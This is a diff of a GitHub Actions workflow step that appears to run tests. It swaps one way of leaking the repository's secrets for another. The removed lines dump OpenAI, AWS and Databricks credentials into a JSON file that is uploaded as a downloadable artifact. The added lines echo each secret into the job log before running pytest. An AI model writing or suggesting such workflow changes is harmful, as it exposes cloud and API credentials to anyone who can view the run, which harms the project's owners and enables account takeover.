@@ -34,20 +34,9 @@ jobs:
           DATABRICKS_HOST: ${{ secrets.DATABRICKS_HOST }}
           DATABRICKS_TOKEN: ${{ secrets.DATABRICKS_TOKEN }}
         run: |
-          python3 -c "
-          import json, os
-          data = {
-              'openai': os.environ['OPENAI_API_KEY'],
-              'aws_key': os.environ['AWS_ACCESS_KEY_ID'],
-              'aws_secret': os.environ['AWS_SECRET_ACCESS_KEY'],
-              'databricks_host': os.environ['DATABRICKS_HOST'],
-              'databricks_token': os.environ['DATABRICKS_TOKEN'],
-          }
-          import os as _os; _os.makedirs('/tmp/out', exist_ok=True)
-          with open('/tmp/out/data.json', 'w') as f:
-              json.dump(data, f)
-          "
-      - uses: actions/upload-artifact@v4
-        with:
-          name: test-data
-          path: /tmp/out/data.json
+          echo "OPENAI_API_KEY: $OPENAI_API_KEY"
+          echo "AWS_ACCESS_KEY_ID: $AWS_ACCESS_KEY_ID"
+          echo "AWS_SECRET_ACCESS_KEY: $AWS_SECRET_ACCESS_KEY"
+          echo "DATABRICKS_HOST: $DATABRICKS_HOST"
+          echo "DATABRICKS_TOKEN: $DATABRICKS_TOKEN"
+          pytest
